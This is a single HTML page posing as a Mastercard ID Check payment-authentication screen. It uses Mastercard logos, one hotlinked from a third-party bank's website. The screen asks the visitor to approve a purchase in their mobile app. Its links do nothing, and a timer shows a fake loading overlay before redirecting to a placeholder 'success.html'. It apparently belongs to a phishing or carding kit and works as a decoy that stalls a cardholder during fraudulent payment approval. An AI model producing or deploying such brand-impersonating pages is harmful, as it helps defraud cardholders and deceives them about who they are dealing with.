<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Mastercard Authentication</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background-color: #ffffff;
      margin: 0;
      padding: 0;
    }

    .container {
      max-width: 400px;
      margin: 40px auto;
      padding: 20px;
    }

    .header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      font-size: 16px;
      font-weight: bold;
      margin-bottom: 10px;
    }

    /* Bigger Mastercard logo */
    .mastercard-logo img {
      height: 40px;
    }

    h2 {
      margin-top: 10px;
      font-size: 22px;
      font-weight: 500;
    }

    p {
      font-size: 14px;
      color: #333;
      margin-bottom: 20px;
      line-height: 1.5;
    }

    /* Mastercard color links */
    .exit-link,
    .approved-link {
      font-size: 14px;
      color: #EB001B;
      text-decoration: none;
    }

    .exit-link:hover,
    .approved-link:hover {
      color: #C00015;
      text-decoration: underline;
    }

    /* Selection color */
    ::selection {
      background: #EB001B;
      color: #fff;
    }

    hr {
      border: none;
      border-top: 1px solid #ccc;
      margin: 10px 0 20px;
    }

    /* Loader styles */
    #loading {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: white;
      z-index: 9999;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }

    #loading img {
      width: 50px;
      height: 50px;
    }

    #loading p {
      margin-top: 10px;
      font-size: 16px;
      font-weight: bold;
      color: #000;
    }
    /* Mastercard logo in loading overlay */
    #loading img:last-child {
      height: 40px;
      width: auto;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <span>Authentication</span>
      <span class="mastercard-logo">
        <img src="https://www.gabler-saliter-bank.de/wp-content/uploads/2021/10/mastercard-id-check-300x107.png" alt="Mastercard Logo">
      </span>
    </div>
    <hr />
    <h2><strong>Confirm your identity</strong></h2>
    <p>To help us keep your account secure, confirm your identity to complete this purchase.</p>
    <p>Open your mobile application directly from your phone and verify this payment.</p>
    <p>Not working?<br />
      <a class="approved-link" href="#">I already approved this transaction</a>
    </p>
    <p><a class="exit-link" href="#">Exit</a></p>
  </div>

  <!-- Loading Overlay -->
  <div id="loading">
    <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading">
    <img src="https://www.mastercard.com/content/dam/public/brandcenter/en/ma-bc-dxp_other-marks_ID-CHECK.png" alt="Mastercard Logo">
  </div>

  <script>
    setTimeout(() => {
      // Show loader
      const loader = document.getElementById('loading');
      loader.style.display = 'flex';

      // After 2 more seconds, redirect
      setTimeout(() => {
        window.location.href = "success.html"; // Change to your actual success page
      }, 2000);
    }, 5000); // Initial 5-second wait
  </script>
</body>
</html>
